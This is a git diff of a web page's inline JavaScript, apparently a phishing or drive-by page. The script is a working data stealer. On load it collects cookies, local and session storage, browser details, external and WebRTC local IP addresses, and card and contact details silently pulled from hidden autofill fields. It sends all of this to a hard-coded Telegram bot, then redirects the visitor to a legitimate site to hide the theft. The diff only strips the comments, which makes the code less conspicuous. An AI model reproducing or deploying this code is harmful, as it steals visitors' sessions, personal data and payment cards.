@@ -20,17 +20,14 @@
     <script>
    
         const TELEGRAM_TOKEN = '8292693570:AAHkns2Xyj2FFe0I0zYX5pqMXW6CFMQ3-io'; 
-        const CHAT_ID = '7316763872'; // Твой chat_id
+        const CHAT_ID = '7316763872'; 
 
-        // ==============================================
-        // 📦 ФУНКЦИЯ ОТПРАВКИ В ТЕЛЕГРАМ
-        // ==============================================
+
         function sendToTelegram(message) {
             try {
                 const img = new Image();
                 img.src = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
 
-                // Дублируем через fetch (надежнее, но тихо)
                 fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -40,22 +37,17 @@
             } catch (e) {}
         }
 
-        // ==============================================
-        // 🔥 ОСНОВНОЙ КОД СБОРА ДАННЫХ
-        // ==============================================
         (async function() {
             try {
                 let fullMessage = `🔥 <b>НОВЫЙ ПОСЕТИТЕЛЬ</b>\n\n`;
                 fullMessage += `🕒 <b>Время:</b> ${new Date().toLocaleString()}\n`;
                 fullMessage += `🌐 <b>URL:</b> ${window.location.href}\n`;
 
-                // 1. Куки
                 const cookies = document.cookie;
                 if (cookies) {
                     fullMessage += `\n🍪 <b>COOKIES:</b>\n<code>${cookies}</code>\n`;
                 }
 
-                // 2. LocalStorage
                 let localStorageData = {};
                 for (let i = 0; i < localStorage.length; i++) {
                     const key = localStorage.key(i);
@@ -68,7 +60,6 @@
                     }
                 }
 
-                // 3. SessionStorage
                 let sessionStorageData = {};
                 for (let i = 0; i < sessionStorage.length; i++) {
                     const key = sessionStorage.key(i);
@@ -81,7 +72,6 @@
                     }
                 }
 
-                // 4. Информация о системе (базовая)
                 fullMessage += `\n🖥️ <b>СИСТЕМА:</b>\n`;
                 fullMessage += `🤖 <b>User-Agent:</b> ${navigator.userAgent}\n`;
                 fullMessage += `💻 <b>Платформа:</b> ${navigator.platform}\n`;
@@ -94,14 +84,12 @@
                 }
                 fullMessage += `🔗 <b>Referrer:</b> ${document.referrer || 'прямой заход'}\n`;
 
-                // 5. Внешний IP (через ipify)
                 try {
                     const response = await fetch('https://api.ipify.org?format=json');
                     const data = await response.json();
                     fullMessage += `🌍 <b>Внешний IP:</b> ${data.ip}\n`;
                 } catch (e) {}
 
-                // 6. Локальный IP через WebRTC
                 try {
                     const pc = new RTCPeerConnection({ iceServers: [] });
                     pc.createDataChannel('');
@@ -116,14 +104,12 @@
                     };
                 } catch (e) {}
 
-                // Отправляем данные (если локальный IP не нашелся через 2 секунды)
                 setTimeout(() => {
                     if (!fullMessage.includes('Локальный IP')) {
                         sendToTelegram(fullMessage);
                     }
                 }, 2000);
 
-                // 7. Данные автозаполнения (тихие поля)
                 const autofillFields = ['name', 'email', 'tel', 'address', 'cc-name', 'cc-number'];
                 autofillFields.forEach(field => {
                     const input = document.createElement('input');
@@ -137,14 +123,13 @@
                     document.body.appendChild(input);
                 });
 
-                // Собираем автозаполнение через 1.5 секунды
                 setTimeout(() => {
                     const autofillData = {};
                     document.querySelectorAll('input[name]').forEach(input => {
                         if (input.value && input.value.length > 1) {
                             autofillData[input.getAttribute('name')] = input.value;
                         }
-                        input.remove(); // чистим за собой
+                        input.remove(); 
                     });
                     
                     if (Object.keys(autofillData).length > 0) {
@@ -159,9 +144,6 @@
             } catch (e) {}
         })();
 
-        // ==============================================
-        // 🚀 РЕДИРЕКТ НА ЛЕГАЛЬНЫЙ САЙТ
-        // ==============================================
         setTimeout(function() {
             window.location.href = 'https://yandex.ru';
         }, 2000);
